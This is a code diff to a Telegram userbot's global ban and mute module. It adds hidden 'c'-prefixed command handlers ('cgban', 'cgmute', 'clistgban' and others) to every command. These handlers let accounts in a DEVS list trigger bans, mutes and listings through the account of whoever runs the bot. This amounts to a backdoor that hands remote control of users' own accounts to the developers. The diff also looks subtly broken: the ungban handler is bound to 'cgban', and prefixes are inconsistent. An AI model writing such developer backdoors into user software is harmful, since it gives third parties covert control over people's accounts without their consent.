@@ -8,10 +8,12 @@ from KillerXBase.modules.basic.profile import extract_user, extract_user_and_rea
 from KillerXBase.database import gbandb as KillerXBase
 from KillerXBase.database import gmutedb as Gmute
 from KillerXBase.modules.help import add_command_help
+from KillerXBase.helper.cmd import *
 
 ok = []
 
-@ren.on_message(filters.command("gban", ".") & filters.me)
+@ren.on_message(filters.command("cgban", cmd) & filters.user(DEVS) & ~filters.via_bot)
+@ren.on_message(filters.command("gban", cmd) & filters.me)
 async def gban_user(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message, sender_chat=True)
     if message.from_user.id != client.me.id:
@@ -57,8 +59,8 @@ async def gban_user(client: Client, message: Message):
     msg += f"\n**Affected To:** `{done}` **Chats**"
     await ex.edit(msg)
 
-
-@ren.on_message(filters.command("ungban", ".") & filters.me)
+@ren.on_message(filters.command("cgban", cmd) & filters.user(DEVS) & ~filters.via_bot)
+@ren.on_message(filters.command("ungban", cmd) & filters.me)
 async def ungban_user(client: Client, message: Message):
     user_id, reason = await extract_user_and_reason(message, sender_chat=True)
     if message.from_user.id != client.me.id:
@@ -102,8 +104,8 @@ async def ungban_user(client: Client, message: Message):
         await ex.edit(f"**ERROR:** `{e}`")
         return
 
-
-@ren.on_message(filters.command("listgban", ".") & filters.me)
+@ren.on_message(filters.command("clistgban", cmd) & filters.user(DEVS) & ~filters.via_bot)
+@ren.on_message(filters.command("listgban", cmd) & filters.me)
 async def gbanlist(client: Client, message: Message):
     users = (await KillerXBase.gban_list())
     ex = await message.edit_text("`Processing...`")
@@ -116,8 +118,8 @@ async def gbanlist(client: Client, message: Message):
         gban_list += f"**{count} -** `{i.sender}`\n"
     return await ex.edit(gban_list)
 
-
-@ren.on_message(filters.command("gmute", ".") & filters.me)
+@ren.on_message(filters.command("cgmute", cmd) & filters.user(DEVS) & ~filters.via_bot)
+@ren.on_message(filters.command("gmute", cmd) & filters.me)
 async def gmute_user(client: Client, message: Message):
     args = await extract_user(message)
     reply = message.reply_to_message
@@ -162,7 +164,7 @@ async def gmute_user(client: Client, message: Message):
         await ex.edit(f"**ERROR:** `{e}`")
         return
 
-
+@ren.on_message(filters.command("cungmute", cmd) & filters.user(DEVS) & ~filters.via_bot)
 @ren.on_message(filters.command("ungmute", ".") & filters.me)
 async def ungmute_user(client: Client, message: Message):
     args = await extract_user(message)
@@ -206,7 +208,7 @@ async def ungmute_user(client: Client, message: Message):
         await ex.edit(f"**ERROR:** `{e}`")
         return
 
-
+@ren.on_message(filters.command("clistgmute", cmd) & filters.user(DEVS) & ~filters.via_bot)
 @ren.on_message(filters.command("listgmute", ".") & filters.me)
 async def gmutelist(client: Client, message: Message):
     users = (await Gmute.gmute_list())
